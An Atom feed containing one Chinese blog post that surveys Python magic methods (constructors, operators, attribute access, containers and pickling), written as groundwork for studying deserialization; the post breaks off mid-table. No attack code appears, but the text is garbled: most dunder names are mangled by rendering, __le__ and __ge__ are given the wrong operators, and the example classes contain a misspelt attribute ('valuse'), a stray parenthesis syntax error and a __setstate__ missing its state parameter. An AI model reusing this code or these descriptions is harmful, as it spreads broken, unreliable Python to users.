<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Fxizenta</title>
  <icon>https://www.gravatar.com/avatar/4228837cba43fcbe7a475443e3f4ec19</icon>
  <subtitle>太阳尚远，但必有太阳</subtitle>
  <link href="http://www.fxizenta.design/atom.xml" rel="self"/>
  
  <link href="http://www.fxizenta.design/"/>
  <updated>2021-09-06T07:57:54.637Z</updated>
  <id>http://www.fxizenta.design/</id>
  
  <author>
    <name>Fxizenta</name>
    <email>fxizenta14@gmail.com</email>
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>python里的魔法方法</title>
    <link href="http://www.fxizenta.design/2021/09/06/python-magic/"/>
    <id>http://www.fxizenta.design/2021/09/06/python-magic/</id>
    <published>2021-09-06T07:49:59.000Z</published>
    <updated>2021-09-06T07:57:54.637Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Python里的魔法方法"><a href="#Python里的魔法方法" class="headerlink" title="Python里的魔法方法"></a>Python里的魔法方法</h1><p>最近准备学习一波python反序列化，于是决定从python的魔法方法开始复习一下，python的魔法方法和php的还是有比较大的区别的，同时也用于以后的复习</p><p>参考：<a href="https://github.com/RafeKettler/magicmethods">https://github.com/RafeKettler/magicmethods</a></p><h1 id="构造方法"><a href="#构造方法" class="headerlink" title="构造方法"></a>构造方法</h1><p>我们最常见的就是<code>__init__</code>,一般用于初始化对象，当然当我们建立一个新的对象，最早调用的是<code>__new__</code>,而不是<code>__init__</code>.而<code>__del__</code>则会在对象生命周期结束时被调用</p><p><code>__new__(cls,[...])</code></p><p>只取下cls参数，然后把其他参数给<code>__init__</code></p><p><code>__init__(self,[...])</code></p><p><code>__del__(self)</code></p><p><code>cls</code>和<code>self</code>的区别简单来说就是<code>self</code>是具体示例对象的本身，而<code>cls</code>则是对应于类的本身</p><h1 id="操作符"><a href="#操作符" class="headerlink" title="操作符"></a>操作符</h1><p>使用Python魔法方法的一个巨大优势就是可以构建一个拥有Python内置类型行为的对象。这意味着你可以避免使用非标准的、丑陋的方式来表达简单的操作。</p><p>例如当我们定义了<code>__eq__</code>以后，那么这个类的==就会调用上面我们定义的那个魔法函数，类似于C++的重载运算符。</p><h2 id="比较操作符"><a href="#比较操作符" class="headerlink" title="比较操作符"></a>比较操作符</h2><ul><li><p><em>_<em>cmp_</em>(self, other)</em></p><p><em>_<em>cmp_</em></em> 是所有比较魔法方法中最基础的一个，它实际上定义了所有比较操作符的行为（&lt;,==,!=,等等），但是它可能不能按照你需要的方式工作（例如，判断一个实例和另一个实例是否相等采用一套标准，而与判断一个实例是否大于另一实例采用另一套）。 <em>_<em>cmp_</em></em> 应该在 <em>self &lt; other</em> 时返回一个负整数，在<em>self == other</em> 时返回0，在 <em>self &gt; other</em> 时返回正整数。最好只定义你所需要的比较形式，而不是一次定义全部。 如果你需要实现所有的比较形式，而且它们的判断标准类似，那么 <em>_<em>cmp_</em></em> 是一个很好的方法，可以减少代码重复，让代码更简洁。</p></li><li><p><em>_<em>eq_</em>`(self, other)</em></p><p>定义等于操作符(==)的行为。</p></li><li><p><em>_<em>ne_</em>(self, other)</em></p><p>定义不等于操作符(!=)的行为。</p></li><li><p><em>_<em>lt_</em>(self, other)</em></p><p>定义小于操作符(&lt;)的行为。</p></li><li><p><em>_<em>gt_</em>(self, other)</em></p><p>定义大于操作符(&gt;)的行为。</p></li><li><p><em>_<em>le_</em>(self, other)</em></p><p>定义小于等于操作符(&lt;)的行为。</p></li><li><p><em>_<em>ge_</em>(self, other)</em></p><p>定义大于等于操作符(&gt;)的行为。</p></li></ul><h2 id="数值操作符"><a href="#数值操作符" class="headerlink" title="数值操作符"></a>数值操作符</h2><p>主要有五类：一元操作符，常见算数操作符，反射算数操作符（后面会涉及更多），增强赋值操作符，和类型转换操作符。</p><p>常见算数操作符和增强赋值运算符基本和C++的重载运算符一致，其余则是python比C++多的</p><h3 id="一元操作符"><a href="#一元操作符" class="headerlink" title="一元操作符"></a>一元操作符</h3><p>顾名思义，只有一个参数的操作符</p><ul><li><p><em>_<em>pos_</em>(self)</em></p><p>实现取正操作，例如 <em>+some_object</em>。</p></li><li><p><em>_<em>neg_</em>(self)</em></p><p>实现取负操作，例如 <em>-some_object</em>。</p></li><li><p><em>_<em>abs_</em>(self)</em></p><p>实现内建绝对值函数 <em>abs()</em> 操作。</p></li><li><p><em>_<em>invert_</em>(self)</em></p><p>实现取反操作符 <em>~</em>。</p></li><li><p>_<em>round_</em>(self， n)</p><p>实现内建函数 <em>round()</em> ，n 是近似小数点的位数。</p></li><li><p><em>_<em>floor_</em>(self)</em></p><p>实现 <em>math.floor()</em> 函数，即向下取整。</p></li><li><p><em>_<em>ceil_</em>(self)</em></p><p>实现 <em>math.ceil()</em> 函数，即向上取整。</p></li><li><p><em>_<em>trunc_</em>(self)</em></p><p>实现 <em>math.trunc()</em> 函数，即距离零最近的整数。</p></li></ul><h3 id="常见算数操作符"><a href="#常见算数操作符" class="headerlink" title="常见算数操作符"></a>常见算数操作符</h3><p>主要是二元操作符和一些函数</p><ul><li><p><em>_<em>add_</em>(self, other)</em></p><p>实现加法操作。</p></li><li><p><em>_<em>sub_</em>(self, other)</em></p><p>实现减法操作。</p></li><li><p><em>_<em>mul_</em>(self, other)</em></p><p>实现乘法操作。</p></li><li><p><em>_<em>floordiv_</em>(self, other)</em></p><p>实现使用 <em>//</em> 操作符的整数除法。</p></li><li><p><em>_<em>div_</em>(self, other)</em></p><p>实现使用 <em>/</em> 操作符的除法。</p></li><li><p><em>_<em>truediv_</em>(self, other)</em></p><p>实现 <em><em>true</em></em> 除法，这个函数只有使用 <em>from _<em>future_</em> import division</em> 时才有作用。</p></li><li><p><em>_<em>mod_</em>(self, other)</em></p><p>实现 <em>%</em> 取余操作。</p></li><li><p><em>_<em>divmod_</em>(self, other)</em></p><p>实现 <em>divmod</em> 内建函数。</p></li><li><p><em>_<em>pow_</em></em></p><p>实现 <em>**</em> 操作符。</p></li><li><p><em>_<em>lshift_</em>(self, other)</em></p><p>实现左移位运算符 <em>&lt;&lt;</em> 。</p></li><li><p><em>_<em>rshift_</em>(self, other)</em></p><p>实现右移位运算符 <em>&gt;&gt;</em> 。</p></li><li><p><em>_<em>and_</em>(self, other)</em></p><p>实现按位与运算符 <em>&amp;</em> 。</p></li><li><p><em>_<em>or_</em>(self, other)</em></p><p>实现按位或运算符 <em>|</em> 。</p></li><li><p><em>_<em>xor_</em>(self, other)</em></p><p>实现按位异或运算符 <em>^</em> 。</p></li></ul><h3 id="反射算数运算符"><a href="#反射算数运算符" class="headerlink" title="反射算数运算符"></a>反射算数运算符</h3><p>反射可以理解为一种逆的思维，下面以加法为例，下面是对象的加法</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">object</span> + other</span><br></pre></td></tr></table></figure><p>而反射算数运算符则是</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">other+<span class="built_in">object</span></span><br></pre></td></tr></table></figure><p>所有反射运算符魔法方法和它们的常见版本做的工作相同，只不过是处理交换连个操作数之后的情况。绝大多数情况下，反射运算和正常顺序产生的结果是相同的，所以很可能你定义 <code>__radd__</code> 时只是调用一下 <code>__add__</code>。</p><ul><li><p><em>_<em>radd_</em>(self, other)</em></p><p>实现反射加法操作。</p></li><li><p><em>_<em>rsub_</em>(self, other)</em></p><p>实现反射减法操作。</p></li><li><p><em>_<em>rmul_</em>(self, other)</em></p><p>实现反射乘法操作。</p></li><li><p><em>_<em>rfloordiv_</em>(self, other)</em></p><p>实现使用 <em>//</em> 操作符的整数反射除法。</p></li><li><p><em>_<em>rdiv_</em>(self, other)</em></p><p>实现使用 <em>/</em> 操作符的反射除法。</p></li><li><p><em>_<em>rtruediv_</em>(self, other)</em></p><p>实现 <em><em>true</em></em> 反射除法，这个函数只有使用 <em>from <strong>future</strong> import division</em>时才有作用。</p></li><li><p><em>_<em>rmod_</em>(self, other)</em></p><p>实现 <em>%</em> 反射取余操作符。</p></li><li><p><em>_<em>rdivmod_</em>(self, other)</em></p><p>实现调用 <em>divmod(other, self)</em> 时 <em>divmod</em> 内建函数的操作。</p></li><li><p><em>_<em>rpow_</em></em></p><p>实现 <em>**</em> 反射操作符。</p></li><li><p><em>_<em>rlshift_</em>(self, other)</em></p><p>实现反射左移位运算符 <em>&lt;&lt;</em> 的作用。</p></li><li><p><em>_<em>rshift_</em>(self, other)</em></p><p>实现反射右移位运算符 <em>&gt;&gt;</em> 的作用。</p></li><li><p><em>_<em>rand_</em>(self, other)</em></p><p>实现反射按位与运算符 <em>&amp;</em> 。</p></li><li><p><em>_<em>ror_</em>(self, other)</em></p><p>实现反射按位或运算符 <em>|</em> 。</p></li><li><p><em>_<em>rxor_</em>(self, other)</em></p><p>实现反射按位异或运算符 <em>^</em> 。</p></li></ul><h3 id="增强赋值操作符"><a href="#增强赋值操作符" class="headerlink" title="增强赋值操作符"></a>增强赋值操作符</h3><p>增强赋值操作符其实就是那些+=,-=那些</p><ul><li><p><em>_<em>iadd_</em>(self, other)</em></p><p>实现加法赋值操作。</p></li><li><p><em>_<em>isub_</em>(self, other)</em></p><p>实现减法赋值操作。</p></li><li><p><em>_<em>imul_</em>(self, other)</em></p><p>实现乘法赋值操作。</p></li><li><p><em>_<em>ifloordiv_</em>(self, other)</em></p><p>实现使用 <em>//=</em> 操作符的整数除法赋值操作。</p></li><li><p><em>_<em>idiv_</em>(self, other)</em></p><p>实现使用 <em>/=</em> 操作符的除法赋值操作。</p></li><li><p><em>_<em>itruediv_</em>(self, other)</em></p><p>实现 <em><em>true</em></em> 除法赋值操作，这个函数只有使用 <em>from <strong>future</strong> import division</em> 时才有作用。</p></li><li><p><em>_<em>imod_</em>(self, other)</em></p><p>实现 <em>%=</em> 取余赋值操作。</p></li><li><p><em>_<em>ipow_</em></em></p><p>实现 <em>**=</em> 操作。</p></li><li><p><em>_<em>ilshift_</em>(self, other)</em></p><p>实现左移位赋值运算符 <em>&lt;&lt;=</em> 。</p></li><li><p><em>_<em>irshift_</em>(self, other)</em></p><p>实现右移位赋值运算符 <em>&gt;&gt;=</em> 。</p></li><li><p><em>_<em>iand_</em>(self, other)</em></p><p>实现按位与运算符 <em>&amp;=</em> 。</p></li><li><p><em>_<em>ior_</em>(self, other)</em></p><p>实现按位或赋值运算符 <em>|</em> 。</p></li><li><p><em>_<em>ixor_</em>(self, other)</em></p><p>实现按位异或赋值运算符 <em>^=</em> 。</p></li></ul><h3 id="类型转换操作符"><a href="#类型转换操作符" class="headerlink" title="类型转换操作符"></a>类型转换操作符</h3><p>用于实现类似 float() 的内建类型转换函数的操作</p><ul><li><p><em>_<em>int_</em>(self)</em></p><p>实现到int的类型转换。</p></li><li><p><em>_<em>long_</em>(self)</em></p><p>实现到long的类型转换。</p></li><li><p><em>_<em>float_</em>(self)</em></p><p>实现到float的类型转换。</p></li><li><p><em>_<em>complex_</em>(self)</em></p><p>实现到complex的类型转换。</p></li><li><p><em>_<em>oct_</em>(self)</em></p><p>实现到八进制数的类型转换。</p></li><li><p><em>_<em>hex_</em>(self)</em></p><p>实现到十六进制数的类型转换。</p></li><li><p><em>_<em>index_</em>(self)</em></p><p>实现当对象用于切片表达式时到一个整数的类型转换。如果你定义了一个可能会用于切片操作的数值类型，你应该定义 <em>_<em>index_</em></em>。</p></li><li><p><em>_<em>trunc_</em>(self)</em></p><p>当调用 <em>math.trunc(self)</em> 时调用该方法， <em>_<em>trunc_</em></em> 应该返回 <em>self</em> 截取到一个整数类型（通常是long类型）的值。</p></li><li><p><em>_<em>coerce_</em>(self)</em></p><p>该方法用于实现混合模式算数运算，如果不能进行类型转换， <em>_<em>coerce_</em></em> 应该返回 <em>None</em> 。反之，它应该返回一个二元组 <em>self</em> 和 <em>other</em> ，这两者均已被转换成相同的类型。</p></li></ul><h1 id="访问控制"><a href="#访问控制" class="headerlink" title="访问控制"></a>访问控制</h1><p>和其他语言不太一样的是，python没有真正的封装，不过python有自己的访问控制，和其他语言不一样的是，这个访问控制不是显式的，而是通过魔术函数来进行访问控制。</p><ul><li><em>_<em>getattr_</em>(self, name)</em></li></ul><p>当用户试图访问一个根本不存在（或者暂时不存在）的属性时，你可以通过这个魔法方法来定义类的行为。这个可以用于捕捉错误的拼写并且给出指引，使用废弃属性时给出警告（如果你愿意，仍然可以计算并且返回该属性），以及灵活地处理AttributeError。只有当试图访问不存在的属性时它才会被调用，所以这不能算是一个真正的封装的办法。</p><ul><li><em>_<em>setattr_</em>(self, name, value)</em></li></ul><p>和 <em>_<em>getattr_</em></em> 不同， <em>_<em>setattr_</em></em> 可以用于真正意义上的封装。它允许你自定义某个属性的赋值行为，不管这个属性存在与否，也就是说你可以对任意属性的任何变化都定义自己的规则。然后，一定要小心使用 <em>_<em>setattr_</em></em> ，这个列表最后的例子中会有所展示。</p><ul><li><em>_<em>delattr_</em>(self, name)</em></li></ul><p>这个魔法方法和 <em>_<em>setattr_</em></em> 几乎相同，只不过它是用于处理删除属性时的行为。和 <em><em>setattr_</em></em> 一样，使用它时也需要多加小心，防止产生无限递归（在<em>_<em>delattr_</em></em> 的实现中调用 <em>del self.name</em> 会导致无限递归）。</p><ul><li><em>_<em>getattribute_</em>(self, name)</em></li></ul><p><code>__getattribute__</code> 看起来和上面那些方法很合得来，但是最好不要使用它。<em>_<em>getattribute_</em></em> 只能用于新式类。在最新版的Python中所有的类都是新式类，在老版Python中你可以通过继承 <em>object</em> 来创建新式类。 <em>_<em>getattribute_</em></em> 允许你自定义属性被访问时的行为，它也同样可能遇到无限递归问题（通过调用基类的<em>_<em>getattribute_</em></em> 来避免）。 <em>_<em>getattribute_</em></em> 基本上可以替代 <em>_<em>getattr_</em></em> 。只有当它被实现，并且显式地被调用，或者产生 <em>AttributeError</em> 时它才被使用。 这个魔法方法可以被使用（毕竟，选择权在你自己），我不推荐你使用它，因为它的使用范围相对有限（通常我们想要在赋值时进行特殊操作，而不是取值时），而且实现这个方法很容易出现Bug。</p><p>注意，自定义<code>__setattr__</code>时赋值要用<code>__dict__</code>而不能直接用=，因为=调用的就是<code>__setattr__</code>直接用=会陷入无限递归的死循环</p><p>要使用下面这种格式</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">__setattr__</span>(<span class="params">self, name, value</span>):</span></span><br><span class="line">    self.__dict__[name] = value <span class="comment"># 使用 __dict__ 进行赋值</span></span><br></pre></td></tr></table></figure><h1 id="自定义序列"><a href="#自定义序列" class="headerlink" title="自定义序列"></a>自定义序列</h1><p>Python中有许多办法可以让你的Python类表现得像是内建序列类型（字典，元组，列表，字符串等）。</p><h2 id="相关知识"><a href="#相关知识" class="headerlink" title="相关知识"></a>相关知识</h2><p>在python中实现自定义容器类型需要用到一些协议，协议类似某些语言中的接口，里面包含的是一些必须实现的方法。在Python中，协议完全是非正式的，也不需要显式的声明，事实上，它们更像是一种参考标准。</p><p>实现一个不可变容器，你需要定义<code>__len__</code> 和<code>__getitem__</code></p><p>而可变容器则不仅需要上面的两个方法，还需要定义<code>__setitem__</code> 和 <code>__delitem__</code></p><p>如果你还想要你的对象可以进行迭代，那么你还需要定义<code>__iter__</code></p><p>上面提到各个魔法方法详情可见于下面</p><h2 id="容器背后的魔法方法"><a href="#容器背后的魔法方法" class="headerlink" title="容器背后的魔法方法"></a>容器背后的魔法方法</h2><ul><li><p><em>_<em>len_</em>(self)</em></p><p>返回容器的长度，可变和不可变类型都需要实现。</p></li><li><p><em>_<em>getitem_</em>(self, key)</em></p><p>定义对容器中某一项使用 <em>self[key]</em> 的方式进行读取操作时的行为。这也是可变和不可变容器类型都需要实现的一个方法。它应该在键的类型错误式产生<em>TypeError</em> 异常，同时在没有与键值相匹配的内容时产生 <em>KeyError</em> 异常。</p></li><li><p><em>_<em>setitem_</em>(self, key)</em></p><p>定义对容器中某一项使用 <em>self[key]</em> 的方式进行赋值操作时的行为。它是可变容器类型必须实现的一个方法，同样应该在合适的时候产生 <em>KeyError</em> 和<em>TypeError</em> 异常。</p></li><li><p><em>_<em>iter_</em>(self, key)</em></p><p>它应该返回当前容器的一个迭代器。迭代器以一连串内容的形式返回，最常见的是使用 <em>iter()</em> 函数调用，以及在类似 <em>for x in container:</em> 的循环中被调用。迭代器是他们自己的对象，需要定义 <em>_<em>iter_</em></em> 方法并在其中返回自己。</p></li><li><p><em>_<em>reversed_</em>(self)</em></p><p>定义了对容器使用 <em>reversed()</em> 内建函数时的行为。它应该返回一个反转之后的序列。当你的序列类是有序时，类似列表和元组，再实现这个方法，</p></li><li><p><em>_<em>contains_</em>(self, item)</em></p><p><em>_<em>contains_</em></em> 定义了使用 <em>in</em> 和 <em>not in</em> 进行成员测试时类的行为。你可能好奇为什么这个方法不是序列协议的一部分，原因是，如果 <em>_<em>contains_</em></em> 没有定义，Python就会迭代整个序列，如果找到了需要的一项就返回 <em>True</em> 。</p></li><li><p><em>_<em>missing_</em>(self ,key)</em></p><p><em>_<em>missing_</em></em> 在字典的子类中使用，它定义了当试图访问一个字典中不存在的键时的行为（目前为止是指字典的实例，例如我有一个字典 <em>d</em> ， <em>“george”</em> 不是字典中的一个键，当试图访问 <em>d[“george’]</em> 时就会调用<em>d._<em>missing_</em>(“george”)</em> ）</p><p>eg：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FunctionalList</span>:</span></span><br><span class="line">   </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self, values=<span class="literal">None</span></span>):</span></span><br><span class="line">        <span class="keyword">if</span> values <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">            self.values = []</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            self.values = values</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__len__</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">len</span>(self.values)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__getitem__</span>(<span class="params">self, key</span>):</span></span><br><span class="line">        <span class="keyword">return</span> self.values[key]</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__setitem__</span>(<span class="params">self, key, value</span>):</span></span><br><span class="line">        self.values[key] = value</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__delitem__</span>(<span class="params">self, key</span>):</span></span><br><span class="line">        <span class="keyword">del</span> self.values[key]</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__iter__</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">iter</span>(self.values)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__reversed__</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">reversed</span>(self.values)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">append</span>(<span class="params">self, value</span>):</span></span><br><span class="line">        self.values.append(value)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">head</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="keyword">return</span> self.values[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">tail</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="keyword">return</span> self.valuse[<span class="number">1</span>:]</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">init</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="keyword">return</span> self.values[:-<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">last</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="keyword">return</span> self.values[-<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">drop</span>(<span class="params">self, n</span>):</span></span><br><span class="line">        <span class="keyword">return</span> self.values[n:]</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">take</span>(<span class="params">self, n</span>):</span></span><br><span class="line">        <span class="keyword">return</span> self.values[:n]</span><br></pre></td></tr></table></figure><h1 id="Pickling"><a href="#Pickling" class="headerlink" title="Pickling"></a>Pickling</h1><p>下面让我们来关注和python序列相关的内容，也就是Pickling，当你想存储一个对象稍后再取出读取时，Pickling会显得十分有用</p><p>Pickling不仅仅有自己的模块（ pickle ），还有自己的协议和魔法方法。首先，我们先来简要的介绍一下如何pickle已存在的对象类型</p><h2 id="简单示例"><a href="#简单示例" class="headerlink" title="简单示例"></a>简单示例</h2><p>例如我们要将一个字典类型储存起来，之后再将其取出来使用，我们可以把它写入一个文件，但是使用exec()或处理文件输入的方法并不可靠，如果使用纯文本来进行数据储存，数据可能会被破坏或者修改，甚至会被写入恶意代码，所以这个时候就要使用我们的pickle了</p><p>类似于序列化过程</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"></span><br><span class="line">data = &#123;<span class="string">&#x27;foo&#x27;</span>: [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>],</span><br><span class="line">                <span class="string">&#x27;bar&#x27;</span>: (<span class="string">&#x27;Hello&#x27;</span>, <span class="string">&#x27;world!&#x27;</span>),</span><br><span class="line">                <span class="string">&#x27;baz&#x27;</span>: <span class="literal">True</span>&#125;</span><br><span class="line">jar = <span class="built_in">open</span>(<span class="string">&#x27;data.pkl&#x27;</span>, <span class="string">&#x27;wb&#x27;</span>)</span><br><span class="line">pickle.dump(data, jar) <span class="comment"># 将pickle后的数据写入jar文件</span></span><br><span class="line">jar.close()</span><br></pre></td></tr></table></figure><p>反pickle过程</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"></span><br><span class="line">pkl_file = <span class="built_in">open</span>(<span class="string">&#x27;data.pkl&#x27;</span>, <span class="string">&#x27;rb&#x27;</span>) <span class="comment"># 与pickle后的数据连接</span></span><br><span class="line">data = pickle.load(pkl_file) <span class="comment"># 把它加载进一个变量</span></span><br><span class="line"><span class="built_in">print</span> data</span><br><span class="line">pkl_file.close()</span><br></pre></td></tr></table></figure><p>print出的data就是我们之前的data</p><h2 id="Pickle对象"><a href="#Pickle对象" class="headerlink" title="Pickle对象"></a>Pickle对象</h2><p>Pickle不仅可以用于内建联系，任何遵守pickle协议的类都可以被pickle</p><p>Pickle协议有四个可选方法，可以让类自定义它们的行为</p><ul><li><p><em>_<em>getinitargs_</em>(self)</em></p><p>如果你想让你的类在反pickle时调用 <em>_<em>init_</em></em> ，你可以定义<em>_<em>getinitargs_</em>(self)</em> ，它会返回一个参数元组，这个元组会传递给<em>_<em>init_</em></em> 。注意，这个方法只能用于旧式类。</p></li><li><p><em>_<em>getnewargs_</em>(self)</em></p><p>对新式类来说，你可以通过这个方法改变类在反pickle时传递给 <em>_<em>new_</em></em> 的参数。这个方法应该返回一个参数元组。</p></li><li><p><em>_<em>getstate_</em>(self)</em></p><p>你可以自定义对象被pickle时被存储的状态，而不使用对象的 <em>_<em>dict_</em></em> 属性。 这个状态在对象被反pickle时会被 <em>_<em>setstate_</em></em> 使用。</p></li><li><p><em>_<em>setstate_</em>(self)</em></p><p>当一个对象被反pickle时，如果定义了 <em>_<em>setstate_</em></em> ，对象的状态会传递给这个魔法方法，而不是直接应用到对象的 <em>_<em>dict_</em></em> 属性。这个魔法方法和<em>_<em>getstate_</em></em> 相互依存：当这两个方法都被定义时，你可以在Pickle时使用任何方法保存对象的任何状态。</p></li><li><p><em>_<em>reduce_</em>(self)</em></p><p>当定义扩展类型时（也就是使用Python的C语言API实现的类型），如果你想pickle它们，你必须告诉Python如何pickle它们。 <em>_<em>reduce_</em></em> 被定义之后，当对象被Pickle时就会被调用。它要么返回一个代表全局名称的字符串，Pyhton会查找它并pickle，要么返回一个元组。这个元组包含2到5个元素，其中包括：一个可调用的对象，用于重建对象时调用；一个参数元素，供那个可调用对象使用；被传递给 <em>_<em>setstate_</em></em> 的状态（可选）；一个产生被pickle的列表元素的迭代器（可选）；一个产生被pickle的字典元素的迭代器（可选）；</p></li><li><p><em>_<em>reduce<em>ex</em></em>(self)</em></p><p><em>_<em>reduce<em>ex</em></em></em> 的存在是为了兼容性。如果它被定义，在pickle时<em>_<em>reduce<em>ex</em></em></em> 会代替 <em>_<em>reduce_</em></em> 被调用。 <em>_<em>reduce_</em></em> 也可以被定义，用于不支持 <em>_<em>reduce<em>ex</em></em></em> 的旧版pickle的API调用</p></li></ul><p>·</p><h2 id="pickle对象的例子"><a href="#pickle对象的例子" class="headerlink" title="pickle对象的例子"></a>pickle对象的例子</h2><p>会记住它的值曾经是什么，以及那些值是什么时候赋给它的，不过每次pickle时它都会变成空白，因为当前的值不会被储存</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Slate</span>:</span></span><br><span class="line">        <span class="string">&#x27;&#x27;&#x27;存储一个字符串和一个变更日志的类</span></span><br><span class="line"><span class="string">        每次被pickle都会忘记它当前的值&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self, value</span>):</span></span><br><span class="line">                self.value = value</span><br><span class="line">                self.last_change = time.asctime()</span><br><span class="line">                self.history = &#123;&#125;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">def</span> <span class="title">change</span>(<span class="params">self, new_value</span>):</span></span><br><span class="line">                <span class="comment"># 改变当前值，将上一个值记录到历史</span></span><br><span class="line">                self.history[self.last_change] = self.value</span><br><span class="line">                self.value = new_value)</span><br><span class="line">                self.last_change = time.asctime()</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">def</span> <span class="title">print_change</span>(<span class="params">self</span>):</span></span><br><span class="line">                <span class="built_in">print</span> <span class="string">&#x27;Changelog for Slate object:&#x27;</span></span><br><span class="line">                <span class="keyword">for</span> k,v <span class="keyword">in</span> self.history.items():</span><br><span class="line">                        <span class="built_in">print</span> <span class="string">&#x27;%s\t %s&#x27;</span> % (k,v)</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">def</span> <span class="title">__getstate__</span>(<span class="params">self</span>):</span></span><br><span class="line">                <span class="comment"># 故意不返回self.value或self.last_change</span></span><br><span class="line">                <span class="comment"># 我们想在反pickle时得到一个空白的slate</span></span><br><span class="line">                <span class="keyword">return</span> self.history</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">def</span> <span class="title">__setstate__</span>(<span class="params">self</span>):</span></span><br><span class="line">                <span class="comment"># 使self.history = slate，last_change</span></span><br><span class="line">                <span class="comment"># 和value为未定义</span></span><br><span class="line">                self.history = state</span><br><span class="line">                self.value, self.last_change = <span class="literal">None</span>, <span class="literal">None</span></span><br></pre></td></tr></table></figure><h1 id="如何调用魔法方法"><a href="#如何调用魔法方法" class="headerlink" title="如何调用魔法方法"></a>如何调用魔法方法</h1><p>| 魔法方法                        | 什么时候被调用                   | 解释                     |<br>| :——————————————— | :———————————————- | :———————————- 